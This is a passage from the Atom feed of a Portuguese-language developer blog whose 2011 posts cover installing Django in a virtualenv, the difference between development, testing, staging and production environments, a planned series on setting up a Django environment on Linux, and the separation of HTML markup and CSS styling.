ajudar com esta tarefa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ source ~/projeto_django/bin/activate
$ easy_install django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No final da operação, você irá se deparar com uma saída similar a esta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Installed /home/user/projeto_django/lib/python2.6/site-packages/Django-1.2.5-py2.6.egg Processing dependencies for django Finished processing dependencies for django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Isto é a garantia que o &lt;em&gt;Django&lt;/em&gt; foi &lt;strong&gt;instalado dentro deste
ambiente&lt;/strong&gt;, e não está visível para o escopo global da distribuição.
Tente importa o &lt;em&gt;Django&lt;/em&gt; no terminal interativo do &lt;em&gt;Python&lt;/em&gt; da sua
distro e do &lt;em&gt;Python&lt;/em&gt; do seu ambiente isolado e veja o que acontece…&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.profissionaisti.com.br/2009/04/entendendo-o-django/" title="Entendendo o Django"&gt;Entenda o que é o &lt;em&gt;Django&lt;/em&gt; e como ele funciona&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="slackware"></category><category term="virtualenv"></category></entry><entry><title>Diferentes ambientes: Development, Testing, Staging e Production</title><link href="https://klauslaube.com.br/2011/03/07/diferentes-ambientes.html" rel="alternate"></link><published>2011-03-07T12:37:00-03:00</published><updated>2011-03-07T12:37:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-03-07:/2011/03/07/diferentes-ambientes.html</id><summary type="html">&lt;p&gt;Uma das práticas mais interessantes nessa
“nova onda” de qualidade que está “encrostada” nas práticas &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre Agile"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;
de desenvolvimento de &lt;em&gt;software&lt;/em&gt;, é o uso de diferentes ambientes para
diferentes estágios do ciclo de vida de uma aplicação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com auxílio da &lt;a href="{virtualbox-uma-maneira-interessante-de-possuir-varios-sos-em-uma-maquina-so.md" title="Virtualbox: Uma maneira interessante de possuir vários SOs em uma máquina só"&gt;virtualização&lt;/a&gt;, podemos implementar (sem dificuldades)
estes ambientes em qualquer empresa que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Uma das práticas mais interessantes nessa
“nova onda” de qualidade que está “encrostada” nas práticas &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre Agile"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;
de desenvolvimento de &lt;em&gt;software&lt;/em&gt;, é o uso de diferentes ambientes para
diferentes estágios do ciclo de vida de uma aplicação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com auxílio da &lt;a href="{virtualbox-uma-maneira-interessante-de-possuir-varios-sos-em-uma-maquina-so.md" title="Virtualbox: Uma maneira interessante de possuir vários SOs em uma máquina só"&gt;virtualização&lt;/a&gt;, podemos implementar (sem dificuldades)
estes ambientes em qualquer empresa que tenha como cultura entregar
&lt;em&gt;software&lt;/em&gt; de qualidade.&lt;/p&gt;
&lt;h2&gt;Development&lt;/h2&gt;
&lt;p&gt;Ter um ambiente isolado só seu, onde você possa codificar sem se
preocupar com o resto da equipe. Essa é a premissa do ambiente de
desenvolvimento.&lt;/p&gt;
&lt;p&gt;Em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, é muito simples construirmos um &lt;a href="http://blog.triveos.com.br/2010/04/25/trabalhando-com-python-e-django/" title="Trabalhando com Python e Django"&gt;ambiente isolado&lt;/a&gt; em
nossas máquinas, isolado até mesmo do nosso SO. Podemos codificar,
testar, errar e corrigir, sem afetar diretamente os outros membros da
equipe.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.setinet.com.br/" title="Setinet, Internet Controlada"&gt;Onde eu trabalho atualmente&lt;/a&gt;, o ambiente de desenvolvimento é
totalmente construído em uma máquina virtual, devido as fortes
dependências entre ferramentas como &lt;a href="http://www.nagios.org/" title="Monitore a sua infraestrutura com Nagios"&gt;&lt;em&gt;Nagios&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://www.mrtg.org/rrdtool/" title="Data logging e gráficos com RRDTools"&gt;&lt;em&gt;RRDTools&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ao fim do dia (ou de uma &lt;em&gt;feature&lt;/em&gt;), você pode “comitar” suas alterações
para uma máquina central, comumente chamada de “Integration” (podendo
ser o responsável por manter um servidor &lt;a href="http://subversion.tigris.org/" title="Versionamento de projetos com Subversion"&gt;&lt;em&gt;SVN&lt;/em&gt;&lt;/a&gt; ou um repositório
central quando for um &lt;a href="http://en.wikipedia.org/wiki/Distributed_Version_Control_System" title="Leia mais sobre Distributed Version Control System no Wikipedia"&gt;&lt;em&gt;DVCS&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Antes de implantar o método descrito acima, o ambiente de
desenvolvimento era um servidor compartilhado onde os membros da equipe
trabalhavam simultaneamente (no mesmo ambiente). Funcionou e tenho
certeza que funcionaria até hoje, mas acredito que ambientes isolado
sejam mais organizados e seguros.&lt;/p&gt;
&lt;h2&gt;Testing&lt;/h2&gt;
&lt;p&gt;Quando você possui uma equipe de testes em seu projeto, nada melhor do
que montar um servidor onde você possa por à prova as últimas
modificações inseridas em sua aplicação.&lt;/p&gt;
&lt;p&gt;Como eu nunca tive a oportunidade de trabalhar com pessoas dedicadas a
testes, geralmente utilizo o próprio ambiente de &lt;em&gt;staging&lt;/em&gt; para testes.&lt;/p&gt;
&lt;p&gt;Embora &lt;a href="https://klauslaube.com.br/tag/tdd.html" title="Leia mais sobre TDD"&gt;testes unitários&lt;/a&gt; e de &lt;a href="https://klauslaube.com.br/tag/bdd.html" title="Leia mais sobre BDD"&gt;aceitação&lt;/a&gt; sejam amplamente
executados em ambiente de desenvolvimento, quando o projeto ficar
gigante, executar todos os testes do projeto a cada nova feature
desenvolvida pode lhe consumir muito tempo. Neste caso é interessante
você construir um &lt;a href="http://blog.caelum.com.br/integracao-continua/" title="Leia artigo da Caelum falando sobre Continuous Integration"&gt;servidor de integração contínua&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Na &lt;a href="http://uptimetecnologia.com.br/" title="Uptime, garantindo a sua segurança na internet"&gt;&lt;em&gt;Uptime&lt;/em&gt;&lt;/a&gt;, trabalhávamos da seguinte maneira: Existia um servidor
que era responsável apenas por clonar o repositório central e executar
os testes automatizados. Quando um teste falhava, um membro da equipe
era notificado, e ele designava alguém para resolver conflitos e
problemas. O conceito é o mesmo apresentado no &lt;em&gt;link&lt;/em&gt; acima, a exceção é
que esse processo era uma tarefa agendada e executava em determinada
hora do dia (e não diretamente a cada &lt;em&gt;commit&lt;/em&gt; ou em um determinado
momento do processo de integração).&lt;/p&gt;
&lt;h2&gt;Staging&lt;/h2&gt;
&lt;p&gt;O papel do ambiente de &lt;em&gt;staging&lt;/em&gt; é ser o mais próximo da realidade, ou
seja, ele deve ser uma réplica perfeita do ambiente de produção.
Tratando-se de desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, deve-se utilizar o mesmo
serviço &lt;em&gt;web&lt;/em&gt;, o mesmo banco de dados, os mesmos módulos e &lt;em&gt;plugins&lt;/em&gt;.
Isso garantirá um &lt;em&gt;deploy&lt;/em&gt; muito mais “suave” para o ambiente de
produção.&lt;/p&gt;
&lt;p&gt;No meu caso específico, utilizei o ambiente de &lt;em&gt;staging&lt;/em&gt; para, além de
testar a aplicação em um ambiente mais “real”, demonstrar as &lt;em&gt;features&lt;/em&gt;
para o cliente. Logo, ele tinha algo real, e com dados que faziam
sentido, antes mesmo do projeto ir para o ar.&lt;/p&gt;
&lt;p&gt;Ficou mais simples determinar se a solução soluciona o seu problema ou
não.&lt;/p&gt;
&lt;h2&gt;Production&lt;/h2&gt;
&lt;p&gt;E finalmente, o ambiente de produção.&lt;/p&gt;
&lt;p&gt;É neste ambiente que a sua aplicação ganha vida e enfrenta a dura
realidade do mundo :)&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://spacebug.com/effective_development_environments/" title="Uma excelente referência, um artigo bem escrito e objetivo."&gt;&lt;em&gt;Effective Development Environments: Development, Test, Staging/Pre-prod and Production Environments&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.caelum.com.br/integracao-continua/" title="A Caelum é uma das melhores referências do país sobre agile e desenvolvimento em geral."&gt;&lt;em&gt;Caelum&lt;/em&gt;: Integração Contínua&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://devagil.wordpress.com/2007/04/14/4611-integracao-continua/" title="Excelente artigo sobre Integração Contínua dentro do contexto de agile."&gt;Integração Contínua&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dotkernel.com/php-development/php-environment-development-staging-production/" title="Um artigo claro e objetivo sobre os ambientes de Development, Staging e Production."&gt;&lt;em&gt;PHP Environment: Development Staging Production&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dltj.org/article/software-development-practice/" title="Um post muito bom sobre desenvolvimento de software com qualidade."&gt;&lt;em&gt;Traditional Development/Integration/Staging/Production Practice for Software Development&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Acompanhe a produção dos posts da série &lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Saiba como montar o seu ambiente de desenvolvimento para trabalhar com Django"&gt;Montando seu ambiente de
desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt; assinando o &lt;a href="https://klauslaube.com.br/feed/rss.xml" title="Leia os posts deste blog no seu leitor RSS favorito"&gt;&lt;em&gt;Feeds RSS&lt;/em&gt;&lt;/a&gt; ou me
seguindo no &lt;a href="http://www.twitter.com/kplaube" title="Siga-me no Twitter"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="infraestrutura"></category><category term="agile"></category><category term="ambiente-de-desenvolvimento"></category><category term="qualidade"></category><category term="testes"></category></entry><entry><title>Montando seu ambiente de desenvolvimento Django no Linux</title><link href="https://klauslaube.com.br/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html" rel="alternate"></link><published>2011-03-03T21:16:00-03:00</published><updated>2011-03-03T21:16:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-03-03:/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html</id><summary type="html">&lt;p&gt;Vou iniciar uma série de publicações mostrando na prática como montar o
seu ambiente de desenvolvimento para trabalhar com &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O objetivo é ilustrar como você pode facilmente ingressar no &lt;em&gt;Django&lt;/em&gt; e
ter um conjunto de ferramentas simples e eficientes que lhe ajudarão a
desenvolver de forma produtiva …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Vou iniciar uma série de publicações mostrando na prática como montar o
seu ambiente de desenvolvimento para trabalhar com &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O objetivo é ilustrar como você pode facilmente ingressar no &lt;em&gt;Django&lt;/em&gt; e
ter um conjunto de ferramentas simples e eficientes que lhe ajudarão a
desenvolver de forma produtiva e com qualidade.&lt;/p&gt;
&lt;p&gt;Os tópicos serão os seguintes (sujeito a alteração):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django/" title="Montando seu ambiente de desenvolvimento Django no Linux"&gt;Motivação (este &lt;em&gt;post&lt;/em&gt;)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/03/07/diferentes-ambientes/" title="Descubra a diferença entre os ambientes de desenvolvimento"&gt;Diferentes ambientes: &lt;em&gt;Development&lt;/em&gt;, &lt;em&gt;Testing&lt;/em&gt;, &lt;em&gt;Staging&lt;/em&gt; e &lt;em&gt;Production&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/03/18/python-django-virtualenv/" title="Python, Django e virtualenv"&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/04/11/como-organizar-seus-projetos-django/" title="Conheça uma forma bacana para você organizar seus projetos Django"&gt;Como organizar seus projetos &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte/" title="Leia uma introdução ao Mercurial e saiba a razão de não falar sobre Git"&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2/" title="Continuação do post sobre Mercurial e Django"&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/06/04/como-versionar-projetos-django-mercurial-parte-3/" title="Parte final do tutorial sobre Mercurial e Django"&gt;Como versionar projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt; – Parte 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1/" title="Descubra que é possível sim escrever testes em Django"&gt;Ferramentas de testes em &lt;em&gt;Django&lt;/em&gt; – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2/" title="A continuação do post sobre testes em Django com algumas ferramentas eficientes"&gt;Ferramentas de testes em &lt;em&gt;Django&lt;/em&gt; – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep/" title="Conheça o pep8, e deixe o seu código dentro das convenções do Python"&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint/" title="Assegure a qualidade do seu código utilizando o Pylint"&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes/" title="Conheça o Pyflakes, e garanta a qualidade do seu código Python"&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger/" title="Aprenda a prevenir código duplicado com o Clone Digger"&gt;Assegure a qualidade do seu código &lt;em&gt;Python&lt;/em&gt; – &lt;em&gt;Clone Digger&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/11/20/migrations-em-django-south/" title="Aprenda a fazer atualização da estrutura do seu banco de dados, de forma automatizada"&gt;Migrations em &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil/" title="Conheça o Nginx! Uma alternativa mais poderosa ao Apache"&gt;&lt;em&gt;Nginx&lt;/em&gt;: poderoso, rápido e fácil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2012/01/23/supervisor-gerencie-os-processos-seu-servidor-web/" title="Conheça o Supervisor, e tenha os processos do seu servidor, sob controle"&gt;&lt;em&gt;Supervisor&lt;/em&gt;: Aumentando a disponibilidade das suas aplicações &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric/" title="Veja um exemplo prático de automatização de deploy com Fabric"&gt;Automatize o &lt;em&gt;deploy&lt;/em&gt; dos seus projetos com &lt;em&gt;Fabric&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1/" title="Conheça o framework de cache do Django e como usá-lo com o Memcached"&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance – Parte 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://klauslaube.com.br/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2/" title="Conheça um pouco mais do framework de cache do Django"&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance – Parte 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Criando um servidor para projetos &lt;em&gt;Django&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Requisitos&lt;/h2&gt;
&lt;p&gt;Existem centenas (senão milhares) de tutoriais deste tipo espalhados
pela &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, portanto, para variar um pouquinho vamos usar um
ambiente de desenvolvimento diferente:&lt;/p&gt;
&lt;h3&gt;Sistemas Operacionais: Debian e Slackware&lt;/h3&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/tux.png" width="120" height="120" title="Tux, o mascote do Linux" alt="Tux, o mascote do Linux"&gt;&lt;/p&gt;
&lt;p&gt;Embora eu vá utilizar o &lt;a href="http://www.debian.org/" title="Debian, uma das mais famosas e estáveis distros Linux"&gt;&lt;em&gt;Debian 6&lt;/em&gt;&lt;/a&gt; no
ambiente de desenvolvimento, isolarei o ambiente de &lt;em&gt;staging&lt;/em&gt; em uma
máquina virtual. Nela, terei o &lt;a href="http://www.slackware.com/" title="Slackware, uma das distros Linux mais "&gt;&lt;em&gt;Slackware 13.1&lt;/em&gt;&lt;/a&gt; “básico”, e a partir
daí instalaremos banco de dados e servidor &lt;em&gt;Web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Não iremos abordar a instalação das distribuições… existem tutoriais
suficientes na Web sobre isto.&lt;/p&gt;
&lt;h3&gt;Banco de Dados: SQLite e PostgreSQL&lt;/h3&gt;
&lt;p&gt;Para o seu ambiente de desenvolvimento, o &lt;a href="http://www.sqlite.org/" title="Baixe um dos bancos de dados mais simpáticos da atualidade"&gt;&lt;em&gt;SQLite&lt;/em&gt;&lt;/a&gt; quebra um galho.
Pequeno, leve e suficientemente bom para quando você está desenvolvendo
suas aplicações com &lt;em&gt;Django&lt;/em&gt;. Porém, para ambientes de produção (onde a
demanda pode ser grande), o &lt;em&gt;SQLite&lt;/em&gt; é pouco recomendado… então podemos
escolher (tratando-se de bancos relacionais) entre o &lt;a href="http://www.mysql.com/" title="MySQL, o banco de dados mais popular do mundo"&gt;&lt;em&gt;MySQL&lt;/em&gt;&lt;/a&gt; e o
&lt;a href="http://www.postgresql.org/" title="PostgreSQL, o banco de dados open source mais avançado do mundo"&gt;&lt;em&gt;PostgreSQL&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Embora eu seja um usuário “fervoroso” do &lt;em&gt;MySQL&lt;/em&gt;, a aquisição dele pela
&lt;em&gt;Oracle&lt;/em&gt; me deixou com a pulga atrás da orelha. Então, vou aproveitar
para aprender um pouco mais sobre &lt;em&gt;PostgreSQL&lt;/em&gt; enquanto escrevo este
tutorial&lt;/p&gt;
&lt;h3&gt;Servidor Web: Nginx&lt;/h3&gt;
&lt;p&gt;Aposto que você achou que iríamos utilizar &lt;em&gt;Apache&lt;/em&gt; :D&lt;/p&gt;
&lt;p&gt;O &lt;a href="http://nginx.org/" title="Um dos servidores Web mais "&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; é considerado por alguns desenvolvedores o servidor &lt;em&gt;web&lt;/em&gt;
mais robusto da atualidade. &lt;a href="http://pt.wikipedia.org/wiki/Nginx" title="Leia mais sobre Nginx na Wikipedia"&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;, é o quarto
servidor &lt;em&gt;web&lt;/em&gt; mais utilizado no mundo.&lt;/p&gt;
&lt;p&gt;Ótima oportunidade para usá-lo!&lt;/p&gt;
&lt;h3&gt;Python 2.x e Django 1.x.x&lt;/h3&gt;
&lt;p&gt;Até a data desta publicação, o &lt;em&gt;Python (2.x)&lt;/em&gt; estava em sua versão
&lt;a href="http://www.python.org/getit/" title="Baixe o Python gratuitamente"&gt;&lt;em&gt;2.7.1 (stable)&lt;/em&gt;&lt;/a&gt; e o &lt;a href="http://www.djangoproject.com/download/" title="Baixe o Django gratuitamente"&gt;&lt;em&gt;Django&lt;/em&gt; na 1.2.5 &lt;em&gt;(stable)&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizarei a versão 2.6 do &lt;em&gt;Python&lt;/em&gt; por ser mais facilmente encontrada
nas hospedagens &lt;em&gt;web&lt;/em&gt;. Fique livre para escolher o que for melhor para
você.&lt;/p&gt;
&lt;p&gt;Se você quiser acompanhar a produção destes artigos, &lt;a href="https://klauslaube.com.br/feed/rss.xml" title="Leia os posts deste Blog no seu leitor RSS favorito"&gt;assine o &lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="http://www.twitter.com/kplaube" title="Acompanhe o desenvolvimento deste e de outros posts"&gt;siga-me no &lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até mais…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="ambiente-de-desenvolvimento"></category><category term="linux"></category></entry><entry><title>As camadas do desenvolvimento Web</title><link href="https://klauslaube.com.br/2011/02/16/camadas-desenvolvimento-web.html" rel="alternate"></link><published>2011-02-16T16:09:00-02:00</published><updated>2011-02-16T16:09:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-02-16:/2011/02/16/camadas-desenvolvimento-web.html</id><summary type="html">&lt;p&gt;Se eu aprendi alguma coisa com o &lt;em&gt;xHTML&lt;/em&gt;, foi:
Separar marcação, estilos e comportamento tornam a sua vida muito mais
feliz.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Assim como tratando-se de &lt;a href="https://klauslaube.com.br/tag/acessibilidade.html" title="Leia mais sobre Acessibilidade"&gt;acessibilidade&lt;/a&gt;, quando falamos em “camadas
de desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;“, estamos (a grosso modo) falando de
semântica. E nisso, o &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; vem nos presenteando com &lt;em&gt;tags&lt;/em&gt;
supimpas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Se eu aprendi alguma coisa com o &lt;em&gt;xHTML&lt;/em&gt;, foi:
Separar marcação, estilos e comportamento tornam a sua vida muito mais
feliz.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Assim como tratando-se de &lt;a href="https://klauslaube.com.br/tag/acessibilidade.html" title="Leia mais sobre Acessibilidade"&gt;acessibilidade&lt;/a&gt;, quando falamos em “camadas
de desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;“, estamos (a grosso modo) falando de
semântica. E nisso, o &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; vem nos presenteando com &lt;em&gt;tags&lt;/em&gt;
supimpas como a &lt;code&gt;section&lt;/code&gt; e &lt;code&gt;article&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos conhecer um pouco mais sobre desenvolvimento e padrões &lt;em&gt;web&lt;/em&gt;?&lt;/p&gt;
&lt;h2&gt;Marcação com uma boa dose de semântica&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/html-icon.png" width="180" height="180" title="Representação de documentos HTML" alt="Representação de documentos HTML"&gt;&lt;/p&gt;
&lt;p&gt;Algumas referências vão chamar esta camada de “marcação”, outras vão direto ao
ponto chamando-a de “informação”. Eu gosto de pensar que é através da marcação
que damos significado a informação.&lt;/p&gt;
&lt;p&gt;Este conceito foi fortemente utilizado no &lt;em&gt;xHTML&lt;/em&gt; (devido ao seu vínculo
com o próprio &lt;em&gt;XML&lt;/em&gt;). Para dar significado a nossa informação através de
hipertexto, utilizamos o &lt;em&gt;HTML&lt;/em&gt; … e nada mais!&lt;/p&gt;
&lt;p&gt;É nesta camada que “diremos” às máquinas que determinada parte da nossa
informação é mais relevante que a outra, que determinado bloco na
verdade é um conjunto de meta-informação ou que o bloco no fim do
arquivo contém informações menos relevantes. Sendo mais minucioso, é
nesta camada que diremos o que é um parágrafo, o que é um título, um
vínculo com outro documento, um trecho de código que mereça ênfase, uma
lista não-ordenada que servirá como menu de navegação, etc.&lt;/p&gt;
&lt;p&gt;Não importando qual o tipo de sistema que interpretará esta informação
(&lt;em&gt;crawlers&lt;/em&gt;, navegadores, leitores de e-mail ou leitores &lt;em&gt;RSS&lt;/em&gt;), eles
sabem (através do padrão &lt;em&gt;HTML&lt;/em&gt;) do que aquela informação se trata e
como eles devem lidar com ela.&lt;/p&gt;
&lt;h2&gt;Embelezando com estilos&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/css-icon.png" width="180" height="180" title="Ícone representando documento CSS" alt="Ícone representando documento CSS"&gt;&lt;/p&gt;
&lt;p&gt;Antes de fazer minha primeira
aula de &lt;em&gt;Tableless&lt;/em&gt;, eu nem fazia ideia de quão importante são as folhas
de estilos. Você já deve imaginar como eu desenvolvia para a &lt;em&gt;web&lt;/em&gt;:
&lt;em&gt;WYSIWYG&lt;/em&gt; cuspindo tabelas e mais tabelas, com milhares de atributos
“font” e “color” espalhados por dezenas de arquivos.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Um trecho de informação ser da cor verde ou azul irá afetar a
  semântica? Salvo exceções… &lt;strong&gt;não.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Um título &lt;code&gt;h1&lt;/code&gt; ser de tamanho 38px vai afetar a semântica?
  &lt;strong&gt;Não.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;A imagem de fundo utilizada no topo deste &lt;em&gt;blog&lt;/em&gt; altera o
  siginifcado deste &lt;em&gt;post&lt;/em&gt;? &lt;strong&gt;Não.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Tabelas posicionarem elementos na tela é algo semântico? &lt;strong&gt;Não!&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;em&gt;Tableless&lt;/em&gt;, além de defender que as tabelas devem ser usadas apenas
para dados tabulares, prega que a informação deve estar separada da
formatação. Levando em conta que hoje possuímos vários tipos de
navegadores (&lt;em&gt;desktop&lt;/em&gt;, &lt;em&gt;mobile&lt;/em&gt;, &lt;em&gt;embed&lt;/em&gt;, leitores de tela, etc), a
informação deveria ser a mesma para todos os navegadores, mas a
